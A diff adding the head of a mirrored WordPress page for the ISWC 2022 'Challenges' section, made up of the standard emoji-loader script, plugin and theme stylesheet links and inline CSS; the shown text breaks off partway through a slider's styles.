@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Challenges &#8211; ISWC 2022</title>
+<meta name="robots" content="max-image-preview:large">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="ISWC 2022 &raquo; Feed" href="./../feed/index.html">
+<link rel="alternate" type="application/rss+xml" title="ISWC 2022 &raquo; Comments Feed" href="./../comments/feed/index.html">
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":".\/\/wp-includes\/js\/wp-emoji-release.min.js?ver=bb270fba1988038f5680f75b7475565e"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇺🇳","🇺​🇳")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!n(e,"🫱🏻‍🫲🏿","🫱🏻​🫲🏿")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+<style id="wp-emoji-styles-inline-css">img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}</style>
+<link rel="stylesheet" id="wp-block-library-css" href="./../../wp-includes/css/dist/block-library/style.min.css?ver=bb270fba1988038f5680f75b7475565e" media="all">
+<style id="wp-block-library-theme-inline-css">.wp-block-audio figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio figcaption{color:hsla(0,0%,100%,.65)}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed figcaption{color:hsla(0,0%,100%,.65)}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:hsla(0,0%,100%,.65)}.wp-block-image figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-image figcaption{color:hsla(0,0%,100%,.65)}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table figcaption{color:hsla(0,0%,100%,.65)}.wp-block-video figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video figcaption{color:hsla(0,0%,100%,.65)}.wp-block-video{margin:0 0 1em}.wp-block-template-part.has-background{margin-bottom:0;margin-top:0;padding:1.25em 2.375em}</style>
+<style id="classic-theme-styles-inline-css">/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
+<style id="global-styles-inline-css">body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}</style>
+<link rel="stylesheet" id="wordpress-file-upload-style-css" href="./../../wp-content/plugins/wp-file-upload/css/wordpress_file_upload_style.css?ver=bb270fba1988038f5680f75b7475565e" media="all">
+<link rel="stylesheet" id="wordpress-file-upload-style-safe-css" href="./../../wp-content/plugins/wp-file-upload/css/wordpress_file_upload_style_safe.css?ver=bb270fba1988038f5680f75b7475565e" media="all">
+<link rel="stylesheet" id="wordpress-file-upload-adminbar-style-css" href="./../../wp-content/plugins/wp-file-upload/css/wordpress_file_upload_adminbarstyle.css?ver=bb270fba1988038f5680f75b7475565e" media="all">
+<link rel="stylesheet" id="jquery-ui-css-css" href="./../../wp-content/plugins/wp-file-upload/vendor/jquery/jquery-ui.min.css?ver=bb270fba1988038f5680f75b7475565e" media="all">
+<link rel="stylesheet" id="jquery-ui-timepicker-addon-css-css" href="./../../wp-content/plugins/wp-file-upload/vendor/jquery/jquery-ui-timepicker-addon.min.css?ver=bb270fba1988038f5680f75b7475565e" media="all">
+<link rel="stylesheet" id="font-awesome-css" href="./../../wp-content/themes/oceanwp/assets/fonts/fontawesome/css/all.min.css?ver=5.15.1" media="all">
+<link rel="stylesheet" id="simple-line-icons-css" href="./../../wp-content/themes/oceanwp/assets/css/third/simple-line-icons.min.css?ver=2.4.0" media="all">
+<link rel="stylesheet" id="oceanwp-style-css" href="./../../wp-content/themes/oceanwp/assets/css/style.min.css?ver=3.5.1" media="all">
+<link rel="stylesheet" id="elementor-icons-ekiticons-css" href="./../../wp-content/plugins/elementskit-lite/modules/elementskit-icon-pack/assets/css/ekiticons.css?ver=3.0.2" media="all">
+<link rel="stylesheet" id="tablepress-default-css" href="./../../wp-content/tablepress-combined.min.css?ver=24" media="all">
+<link rel="stylesheet" id="elementor-icons-css" href="./../../wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.23.0" media="all">
+<link rel="stylesheet" id="elementor-frontend-css" href="./../../wp-content/plugins/elementor/assets/css/frontend-lite.min.css?ver=3.17.3" media="all">
+<link rel="stylesheet" id="swiper-css" href="./../../wp-content/plugins/elementor/assets/lib/swiper/css/swiper.min.css?ver=5.3.6" media="all">
+<link rel="stylesheet" id="elementor-post-261-css" href="./../../wp-content/uploads/elementor/css/post-261.css?ver=1693876819" media="all">
+<link rel="stylesheet" id="elementor-global-css" href="./../../wp-content/uploads/elementor/css/global.css?ver=1693876819" media="all">
+<link rel="stylesheet" id="elementor-post-1217-css" href="./../../wp-content/uploads/elementor/css/post-1217.css?ver=1693884648" media="all">
+<link rel="stylesheet" id="ekit-widget-styles-css" href="./../../wp-content/plugins/elementskit-lite/widgets/init/assets/css/widget-styles.css?ver=3.0.2" media="all">
+<link rel="stylesheet" id="ekit-responsive-css" href="./../../wp-content/plugins/elementskit-lite/widgets/init/assets/css/responsive.css?ver=3.0.2" media="all">
+<link rel="stylesheet" id="oe-widgets-style-css" href="./../../wp-content/plugins/ocean-extra/assets/css/widgets.css?ver=bb270fba1988038f5680f75b7475565e" media="all">
+<link rel="stylesheet" id="google-fonts-1-css" href="https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CFjalla+One%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=auto&#038;ver=6.4.1" media="all">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+<link rel="stylesheet" type="text/css" href="./../../wp-content/plugins/smart-slider-3/Public/SmartSlider3/Application/Frontend/Assets/dist/smartslider.min.css?ver=78442573" media="all">
+<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?display=swap&amp;family=Roboto%3A300%2C400" media="all">
+<style data-related="n2-ss-4">div#n2-ss-4 .n2-ss-slider-1{display:grid;position:relative;}div#n2-ss-4 .n2-ss-slider-2{display:grid;position:relative;overflow:hidden;padding:0px 0px 0px 0px;border:0px solid RGBA(62,62,62,1);border-radius:0px;background-clip:padding-box;background-repeat:repeat;background-position:50% 50%;background-size:cover;background-attachment:scroll;z-index:1;}div#n2-ss-4:not(.n2-ss-loaded) .n2-ss-slider-2{background-image:none !important;}div#n2-ss-4 .n2-ss-slider-3{display:grid;grid-template-areas:'cover';position:relative;overflow:hidden;z-index:10;}div#n2-ss-4 .n2-ss-slider-3 > *{grid-area:cover;}div#n2-ss-4 .n2-ss-slide-backgrounds,div#n2-ss-4 .n2-ss-slider-3 > .n2-ss-divider{position:relative;}div#n2-ss-4 .n2-ss-slide-backgrounds{z-index:10;}div#n2-ss-4 .n2-ss-slide-backgrounds > *{overflow:hidden;}div#n2-ss-4 .n2-ss-slide-background{transform:translateX(-100000px);}div#n2-ss-4 .n2-ss-slider-4{place-self:center;position:relative;width:100%;height:100%;z-index:20;display:grid;grid-template-areas:'slide';}div#n2-ss-4 .n2-ss-slider-4 > *{grid-area:slide;}div#n2-ss-4.n2-ss-full-page--constrain-ratio .n2-ss-slider-4{height:auto;}div#n2-ss-4 .n2-ss-slide{display:grid;place-items:center;grid-auto-columns:100%;position:relative;z-index:20;-webkit-backface-visibility:hidden;transform:translateX(-100000px);}div#n2-ss-4 .n2-ss-slide{perspective:1500px;}div#n2-ss-4 .n2-ss-slide-active{z-index:21;}.n2-ss-background-animation{position:absolute;top:0;left:0;width:100%;height:100%;z-index:3;}div#n2-ss-4 .nextend-arrow{cursor:pointer;overflow:hidden;line-height:0 !important;z-index:18;-webkit-user-select:none;}div#n2-ss-4 .nextend-arrow img{position:relative;display:block;}div#n2-ss-4 .nextend-arrow img.n2-arrow-hover-img{display:none;}div#n2-ss-4 .nextend-arrow:FOCUS img.n2-arrow-hover-img,div#n2-ss-4 .nextend-arrow:HOVER img.n2-arrow-hover-img{display:inline;}div#n2-ss-4 .nextend-arrow:FOCUS img.n2-arrow-normal-img,div#n2-ss-4 .nextend-arrow:HOVER img.n2-arrow-normal-img{display:none;}div#n2-ss-4 .nextend-arrow-animated{overflow:hidden;}div#n2-ss-4 .nextend-arrow-animated > div{position:relative;}div#n2-ss-4 .nextend-arrow-animated .n2-active{position:absolute;}div#n2-ss-4 .nextend-arrow-animated-fade{transition:background 0.3s, opacity 0.4s;}div#n2-ss-4 .nextend-arrow-animated-horizontal > div{transition:all 0.4s;transform:none;}div#n2-ss-4 .nextend-arrow-animated-horizontal .n2-active{top:0;}div#n2-ss-4 .nextend-arrow-previous.nextend-arrow-animated-horizontal .n2-active{left:100%;}div#n2-ss-4 .nextend-arrow-next.nextend-arrow-animated-horizontal .n2-active{right:100%;}div#n2-ss-4 .nextend-arrow-previous.nextend-arrow-animated-horizontal:HOVER > div,div#n2-ss-4 .nextend-arrow-previous.nextend-arrow-animated-horizontal:FOCUS > div{transform:translateX(-100%);}div#n2-ss-4 .nextend-arrow-next.nextend-arrow-animated-horizontal:HOVER > div,div#n2-ss-4 .nextend-arrow-next.nextend-arrow-animated-horizontal:FOCUS > div{transform:translateX(100%);}div#n2-ss-4 .nextend-arrow-animated-vertical > div{transition:all 0.4s;transform:none;}div#n2-ss-4 .nextend-arrow-animated-vertical .n2-active{left:0;}div#n2-ss-4 .nextend-arrow-previous.nextend-arrow-animated-vertical .n2-active{top:100%;}div#n2-ss-4 .nextend-arrow-next.nextend-arrow-animated-vertical .n2-active{bottom:100%;}div#n2-ss-4 .nextend-arrow-previous.nextend-arrow-animated-vertical:HOVER > div,div#n2-ss-4 .nextend-arrow-previous.nextend-arrow-animated-vertical:FOCUS > div{transform:translateY(-100%);}div#n2-ss-4 .nextend-arrow-next.nextend-arrow-animated-vertical:HOVER > div,div#n2-ss-4 .nextend-arrow-next.nextend-arrow-animated-vertical:FOCUS > div{transform:translateY(100%);}div#n2-ss-4 .n2-ss-control-bullet{visibility:hidden;text-align:center;justify-content:center;z-index:14;}div#n2-ss-4 .n2-ss-control-bullet--calculate-size{left:0 !important;}div#n2-ss-4 .n2-ss-control-bullet-horizontal.n2-ss-control-bullet-fullsize{width:100%;}div#n2-ss-4 .n2-ss-control-bullet-vertical.n2-ss-control-bullet-fullsize{height:100%;flex-flow:column;}div#n2-ss-4 .nextend-bullet-bar{display:inline-flex;vertical-align:top;visibility:visible;align-items:center;flex-wrap:wrap;}div#n2-ss-4 .n2-bar-justify-content-left{justify-content:flex-start;}div#n2-ss-4 .n2-bar-justify-content-center{justify-content:center;}div#n2-ss-4 .n2-bar-justify-content-right{justify-content:flex-end;}div#n2-ss-4 .n2-ss-control-bullet-vertical > .nextend-bullet-bar{flex-flow:column;}div#n2-ss-4 .n2-ss-control-bullet-fullsize > .nextend-bullet-bar{display:flex;}div#n2-ss-4 .n2-ss-control-bullet-horizontal.n2-ss-control-bullet-fullsize > .nextend-bullet-bar{flex:1 1 auto;}div#n2-ss-4 .n2-ss-control-bullet-vertical.n2-ss-control-bullet-fullsize > .nextend-bullet-bar{height:100%;}div#n2-ss-4 .nextend-bullet-bar .n2-bullet{cursor:pointer;transition:background-color 0.4s;}div#n2-ss-4 .nextend-bullet-bar .n2-bullet.n2-active{cursor:default;}div#n2-ss-4 div.n2-ss-bullet-thumbnail-container{position:absolute;z-index:10000000;}div#n2-ss-4 .n2-ss-bullet-thumbnail-container .n2-ss-bullet-thumbnail{background-size:cover;background-repeat:no-repeat;background-position:center;}div#n2-ss-4 .n-uc-1410e5465e7c1-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1410e5465e7c1-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-171ef7a6f1f14-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-171ef7a6f1f14-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n2-font-8c439af5b1447308e4805f29e3c667e0-hover{font-family: 'Roboto','Arial';color: #81898d;font-size:162.5%;text-shadow: none;line-height: 1.5;font-weight: normal;font-style: normal;text-decoration: none;text-align: left;letter-spacing: normal;word-spacing: normal;text-transform: none;font-weight: 400;}div#n2-ss-4 .n-uc-10212f7445602-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-10212f7445602-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1165d11049606-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1165d11049606-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1c9d168d55b36-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1c9d168d55b36-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1c8e61e4d1395-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1c8e61e4d1395-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-15cf046786c16-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-15cf046786c16-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1411de2cd2d0b-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1411de2cd2d0b-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-18827cad0be62-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-18827cad0be62-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1afacbe1860d5-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1afacbe1860d5-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1169d969d1748-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-1169d969d1748-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-13f534e3e8fa1-inner{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 .n-uc-13f534e3e8fa1-inner:HOVER{border-width:0px 0px 0px 0px ;border-style:solid;border-color:RGBA(255,255,255,1);}div#n2-ss-4 